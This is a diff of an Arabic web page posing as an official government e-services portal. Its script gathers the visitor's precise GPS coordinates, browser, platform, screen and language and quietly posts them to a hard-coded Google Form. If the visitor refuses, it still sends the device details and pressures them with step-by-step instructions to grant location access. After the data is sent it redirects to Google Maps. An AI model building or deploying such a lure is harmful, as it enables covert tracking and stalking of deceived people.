@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>بوابة الخدمات الإلكترونية الموحدة</title>
-    <!-- استخدام خط تجوال لإعطاء طابع رسمي مشابه للمواقع الحكومية -->
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -108,6 +107,15 @@
             cursor: not-allowed;
         }
 
+        .btn-refresh {
+            background-color: var(--danger-color);
+            margin-top: 15px;
+        }
+
+        .btn-refresh:hover {
+            background-color: #c82333;
+        }
+
         /* رسائل النظام (نجاح / خطأ) */
         .alert-box {
             display: none;
@@ -125,19 +133,11 @@
             border: 1px solid rgba(220, 53, 69, 0.2);
         }
 
-        .alert-success {
-            background-color: rgba(27, 131, 84, 0.1);
-            color: var(--primary-color);
-            border: 1px solid rgba(27, 131, 84, 0.2);
-            text-align: center;
-            font-weight: bold;
-            font-size: 1.1rem;
-        }
-
         .instructions-list {
             margin-top: 10px;
             padding-right: 20px;
             font-size: 0.85rem;
+            color: var(--text-dark);
         }
 
         .loader {
@@ -168,7 +168,6 @@
     <div class="portal-container">
         <div class="header">
             <div class="header-icon">
-                <!-- أيقونة تعبر عن الخدمات الإلكترونية -->
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
                     <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
@@ -188,7 +187,6 @@
                 <div class="loader" id="btnLoader"></div>
             </button>
 
-            <!-- منطقة الرسائل -->
             <div id="alertBox" class="alert-box"></div>
         </div>
 
@@ -198,26 +196,18 @@
     </div>
 
     <script>
-        // =========================================================================
-        // إعدادات نموذج جوجل (Google Form)
-        // يجب استبدال الروابط ومعرفات الحقول (entry.IDs) ببيانات النموذج الخاص بك
-        // =========================================================================
-        
         const FORM_POST_URL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSccde-5FC3RKLZB-Tq5UsN_jP7Vcu5gCN3LKFGeI0HVS_f3ow/formResponse";
         
-        // تم التحديث بمعرفات الحقول الخاصة بنموذجك
-        const ENTRY_STATUS     = "entry.560644642"; // حالة الإذن
-        const ENTRY_LATITUDE   = "entry.1981918650"; // خط العرض
-        const ENTRY_LONGITUDE  = "entry.1141171242"; // خط الطول
-        const ENTRY_ACCURACY   = "entry.2030681550"; // الدقة
-        const ENTRY_TIME       = "entry.625293889"; // الوقت
-        const ENTRY_USER_AGENT = "entry.1922500127"; // معلومات المتصفح
-        const ENTRY_PLATFORM   = "entry.1237647503"; // النظام
-        const ENTRY_SCREEN     = "entry.1147551305"; // دقة الشاشة
-        const ENTRY_LANGUAGE   = "entry.1327515972"; // اللغة
-        const ENTRY_MAPS_LINK  = "entry.1638046155"; // رابط خرائط جوجل (الحقل العاشر الجديد)
-
-        // =========================================================================
+        const ENTRY_STATUS     = "entry.560644642"; 
+        const ENTRY_LATITUDE   = "entry.1981918650"; 
+        const ENTRY_LONGITUDE  = "entry.1141171242"; 
+        const ENTRY_ACCURACY   = "entry.2030681550"; 
+        const ENTRY_TIME       = "entry.625293889"; 
+        const ENTRY_USER_AGENT = "entry.1922500127"; 
+        const ENTRY_PLATFORM   = "entry.1237647503"; 
+        const ENTRY_SCREEN     = "entry.1147551305"; 
+        const ENTRY_LANGUAGE   = "entry.1327515972"; 
+        const ENTRY_MAPS_LINK  = "entry.1638046155"; 
 
         const startBtn = document.getElementById('startServiceBtn');
         const btnLoader = document.getElementById('btnLoader');
@@ -227,13 +217,12 @@
         startBtn.addEventListener('click', initiateService);
 
         function initiateService() {
-            // تفعيل حالة التحميل
+            // تفعيل حالة التحميل (الأنيميشن)
             startBtn.disabled = true;
             btnLoader.style.display = 'block';
-            btnText.style.display = 'none';
+            btnText.innerText = 'جاري التحقق...';
             alertBox.style.display = 'none';
 
-            // جمع بيانات الجهاز والمتصفح
             const deviceInfo = {
                 time: new Date().toLocaleString('ar-SA'),
                 userAgent: navigator.userAgent,
@@ -242,12 +231,11 @@
                 language: navigator.language || navigator.userLanguage
             };
 
-            // طلب الموقع بدقة عالية
             if (navigator.geolocation) {
                 const options = {
-                    enableHighAccuracy: true, // طلب دقة عالية (GPS)
-                    timeout: 15000,           // أقصى وقت للانتظار
-                    maximumAge: 0             // عدم استخدام موقع مخزن مسبقاً
+                    enableHighAccuracy: true, 
+                    timeout: 15000,           
+                    maximumAge: 0             
                 };
 
                 navigator.geolocation.getCurrentPosition(
@@ -264,34 +252,39 @@
         function handleLocationSuccess(position, deviceInfo) {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
-            const accuracy = position.coords.accuracy; // الدقة بالمتر
+            const accuracy = position.coords.accuracy;
 
-            // إرسال البيانات كاملة
-            sendDataToGoogle("موافق", lat, lng, accuracy, deviceInfo);
-
-            // عرض رسالة النجاح
-            showSuccess("جاري بدء الخدمه...");
+            // إرسال البيانات كاملة للنموذج، وبمجرد الانتهاء يتم التحويل لخرائط جوجل
+            sendDataToGoogle("موافق", lat, lng, accuracy, deviceInfo).finally(() => {
+                // تحويل المستخدم لتطبيق جوجل ماب (سيفتح إحداثيات الموقع مباشرة)
+                window.location.replace(`https://www.google.com/maps?q=${lat},${lng}`);
+            });
         }
 
         function handleLocationError(error, deviceInfo) {
-            // إرسال بيانات الجهاز مع حالة الرفض
+            // إرسال بيانات الجهاز للنموذج وإبلاغه بأن المستخدم رفض الصلاحية
             sendDataToGoogle("مرفوض", "N/A", "N/A", "N/A", deviceInfo);
 
-            let errorMessage = "<strong>تم رفض أو فشل الوصول للموقع!</strong><br>الخدمة تتطلب تحديد موقعك الفعلي للمتابعة.";
+            // إخفاء الزر الأساسي وعرض التنبيه وزر التحديث
+            startBtn.style.display = 'none';
+
+            let errorMessage = "<strong>عذراً، لم نتمكن من الوصول لموقعك!</strong><br>الخدمة تتطلب تحديد موقعك الفعلي للمتابعة ولا يمكن إكمال الإجراء بدون الموافقة على الصلاحية.";
             errorMessage += `<ul class="instructions-list">
-                                <li><strong>لأجهزة الآيفون (Safari):</strong> اضغط على حرفي (ع ع) أو (AA) في شريط الرابط أعلى الشاشة، اختر "إعدادات موقع الويب"، واسمح للموقع.</li>
-                                <li><strong>لأجهزة الأندرويد (Chrome):</strong> اضغط على علامة القفل 🔒 بجانب الرابط أعلى الشاشة، اختر "الأذونات"، وقم بتفعيل الموقع.</li>
-                                <li>قم بتحديث الصفحة بعد إعطاء الصلاحية واضغط على الزر مجدداً.</li>
+                                <li><strong>لأجهزة الآيفون (Safari):</strong> اضغط على حرفي (ع ع) أو (AA) في شريط الرابط بالأعلى، اختر "إعدادات موقع الويب"، واسمح للموقع.</li>
+                                <li><strong>لأجهزة الأندرويد (Chrome):</strong> اضغط على علامة القفل 🔒 بجانب الرابط، اختر "الأذونات"، وقم بتفعيل الموقع.</li>
                              </ul>`;
             
+            // إضافة زر التحديث
+            errorMessage += `<button onclick="location.reload()" class="btn-start btn-refresh">
+                                🔄 تحديث الصفحة لمنح الصلاحية
+                             </button>`;
+            
             showError(errorMessage);
-            resetButton();
         }
 
         function sendDataToGoogle(status, lat, lng, accuracy, device) {
             const formData = new FormData();
             
-            // تعبئة البيانات حسب معرفات النموذج
             formData.append(ENTRY_STATUS, status);
             formData.append(ENTRY_LATITUDE, lat);
             formData.append(ENTRY_LONGITUDE, lng);
@@ -302,42 +295,24 @@
             formData.append(ENTRY_SCREEN, device.screen);
             formData.append(ENTRY_LANGUAGE, device.language);
 
-            // إنشاء رابط مباشر لخرائط جوجل وإضافته
             let mapsLink = "N/A";
             if (lat !== "N/A" && lng !== "N/A") {
                 mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
             }
             formData.append(ENTRY_MAPS_LINK, mapsLink);
 
-            // إرسال البيانات بصمت (بدون إعادة توجيه)
-            fetch(FORM_POST_URL, {
+            // نرجع الـ Promise الخاص بـ fetch عشان نقدر ننفذ التحويل بعد ما يخلص
+            return fetch(FORM_POST_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: formData
             }).catch(err => console.log('Form submission trace:', err));
         }
 
-        function showSuccess(message) {
-            alertBox.className = 'alert-box alert-success';
-            alertBox.innerHTML = message;
-            alertBox.style.display = 'block';
-            
-            // إبقاء الزر معطل بعد النجاح
-            btnLoader.style.display = 'none';
-            btnText.style.display = 'block';
-            btnText.innerText = 'تم التحقق بنجاح';
-        }
-
         function showError(message) {
             alertBox.className = 'alert-box alert-error';
             alertBox.innerHTML = message;
             alertBox.style.display = 'block';
-        }
-
-        function resetButton() {
-            startBtn.disabled = false;
-            btnLoader.style.display = 'none';
-            btnText.style.display = 'block';
         }
     </script>
 </body>
